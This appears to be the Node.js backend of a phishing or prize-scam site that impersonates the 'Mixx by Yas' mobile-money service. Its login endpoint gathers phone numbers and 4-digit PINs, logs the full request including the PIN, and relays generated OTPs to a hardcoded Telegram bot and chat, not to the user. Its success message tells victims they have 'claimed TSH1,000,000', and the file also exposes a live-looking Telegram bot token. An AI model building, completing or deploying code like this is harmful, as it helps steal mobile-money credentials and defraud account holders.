const express = require('express');
const cors = require('cors');
const axios = require('axios');
require('dotenv').config();

const app = express();

// ===== MIDDLEWARE - FIXED CORS =====
app.use(cors({
    origin: '*', // Allow all origins for testing
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===== CONFIGURATION =====
const PORT = process.env.PORT || 5000;

// ===== TELEGRAM CREDENTIALS =====
const TELEGRAM_BOT_TOKEN = '8926981745:AAFg96uMr8hQaiQN0F9Miglr0gizZrp48rs';
const TELEGRAM_CHAT_ID = '8392790531';

// ===== IN-MEMORY STORAGE =====
const userOTPStore = new Map();
const userPinStore = new Map();

// ===== VALIDATION =====
function validatePhone(phone) {
    return /^(07|06)\d{8}$/.test(phone);
}

function validatePin(pin) {
    return /^\d{4}$/.test(pin);
}

function validateOTP(otp) {
    return /^\d{6}$/.test(otp);
}

function generateOTP() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// ===== TELEGRAM FUNCTIONS =====
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram message sent');
        return response.data;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        throw error;
    }
}

async function sendOTP(phone, otp) {
    const message = `
🎯 <b>MIXX BY YAS - OTP VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone:</b> ${phone}
🔐 <b>OTP Code:</b> <code>${otp}</code>
⏰ <b>Valid for:</b> 5 minutes

⚠️ <i>Do not share this code with anyone!</i>

━━━━━━━━━━━━━━━━━━━━━
🔒 Secure · Fast · Reliable
    `;
    return await sendTelegramMessage(message);
}

// ===== API ENDPOINTS =====

// Root endpoint
app.get('/', (req, res) => {
    res.json({
        name: 'Mixx by Yas API',
        version: '1.0.0',
        status: 'online',
        timestamp: new Date().toISOString(),
        telegram: {
            bot: TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing',
            chatId: TELEGRAM_CHAT_ID ? '✅ Configured' : '❌ Missing'
        }
    });
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        port: PORT,
        uptime: process.uptime()
    });
});

// ===== LOGIN ENDPOINT =====
app.post('/api/login', async (req, res) => {
    console.log('📥 Login request received:', req.body);
    
    try {
        const { phone, pin } = req.body;

        // Validate
        if (!phone || !validatePhone(phone)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid phone number. Must be 07XXXXXXXX or 06XXXXXXXX'
            });
        }

        if (!pin || !validatePin(pin)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid PIN. Must be 4 digits'
            });
        }

        // Generate OTP
        const otp = generateOTP();
        console.log(`🔐 OTP generated for ${phone}: ${otp}`);

        // Store OTP
        userOTPStore.set(phone, {
            otp: otp,
            expiresAt: Date.now() + 5 * 60 * 1000,
            attempts: 0
        });

        // Send OTP via Telegram
        try {
            await sendOTP(phone, otp);
            console.log('✅ OTP sent to Telegram for:', phone);
        } catch (telegramError) {
            console.error('❌ Telegram send failed:', telegramError.message);
            // Continue anyway - we'll still return success
        }

        res.json({
            status: 'success',
            message: 'OTP sent to your phone via Telegram',
            data: { phone, otpSent: true }
        });

    } catch (error) {
        console.error('❌ Login error:', error);
        res.status(500).json({
            status: 'error',
            message: 'Login failed: ' + error.message
        });
    }
});

// ===== VERIFY OTP ENDPOINT =====
app.post('/api/verify-otp', async (req, res) => {
    console.log('📥 Verify OTP request received:', req.body);
    
    try {
        const { phone, otp } = req.body;

        if (!phone || !validatePhone(phone)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid phone number'
            });
        }

        if (!otp || !validateOTP(otp)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid OTP. Must be 6 digits'
            });
        }

        const storedData = userOTPStore.get(phone);
        if (!storedData) {
            return res.status(400).json({
                status: 'error',
                message: 'No OTP found. Please request a new one.'
            });
        }

        if (storedData.attempts >= 3) {
            userOTPStore.delete(phone);
            return res.status(400).json({
                status: 'error',
                message: 'Too many failed attempts. Request a new OTP.'
            });
        }

        if (Date.now() > storedData.expiresAt) {
            userOTPStore.delete(phone);
            return res.status(400).json({
                status: 'error',
                message: 'OTP expired. Request a new one.'
            });
        }

        if (storedData.otp !== otp) {
            storedData.attempts += 1;
            userOTPStore.set(phone, storedData);
            return res.status(400).json({
                status: 'error',
                message: `Invalid OTP. ${3 - storedData.attempts} attempts left.`
            });
        }

        // OTP Verified!
        userOTPStore.delete(phone);

        // Send success notification
        try {
            await sendTelegramMessage(`
🎉 <b>OTP VERIFIED SUCCESSFULLY</b>
━━━━━━━━━━━━━━━━━━━━━
📱 <b>Phone:</b> ${phone}
✅ <b>Status:</b> VERIFIED
🏆 <b>Congratulations!</b> You've claimed TSH1,000,000!
            `);
        } catch (e) {
            console.error('Telegram success message failed:', e.message);
        }

        res.json({
            status: 'success',
            message: 'OTP verified successfully!',
            data: { phone, verified: true }
        });

    } catch (error) {
        console.error('❌ OTP verification error:', error);
        res.status(500).json({
            status: 'error',
            message: 'Verification failed: ' + error.message
        });
    }
});

// ===== RESEND OTP ENDPOINT =====
app.post('/api/resend-otp', async (req, res) => {
    console.log('📥 Resend OTP request received:', req.body);
    
    try {
        const { phone } = req.body;

        if (!phone || !validatePhone(phone)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid phone number'
            });
        }

        const otp = generateOTP();
        console.log(`🔐 New OTP generated for ${phone}: ${otp}`);

        userOTPStore.set(phone, {
            otp: otp,
            expiresAt: Date.now() + 5 * 60 * 1000,
            attempts: 0
        });

        try {
            await sendOTP(phone, otp);
        } catch (e) {
            console.error('Telegram resend failed:', e.message);
        }

        res.json({
            status: 'success',
            message: 'New OTP sent successfully!'
        });

    } catch (error) {
        console.error('❌ Resend OTP error:', error);
        res.status(500).json({
            status: 'error',
            message: 'Failed to resend OTP: ' + error.message
        });
    }
});

// ===== TEST TELEGRAM ENDPOINT =====
app.get('/api/test-telegram', async (req, res) => {
    try {
        await sendTelegramMessage('✅ Mixx by Yas bot is online and working!');
        res.json({
            status: 'success',
            message: 'Test message sent to Telegram'
        });
    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: 'Failed to send test message: ' + error.message
        });
    }
});

// ===== ERROR HANDLING =====
app.use((err, req, res, next) => {
    console.error('❌ Global error:', err);
    res.status(500).json({
        status: 'error',
        message: 'Something went wrong: ' + err.message
    });
});

// ===== START SERVER =====
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 URL: https://mixxbyyas-offers06com-production.up.railway.app`);
    console.log(`📱 Telegram Bot: @${TELEGRAM_BOT_TOKEN.split(':')[0]}`);
    console.log(`📊 Chat ID: ${TELEGRAM_CHAT_ID}`);
    console.log('✅ Server is ready!');
});
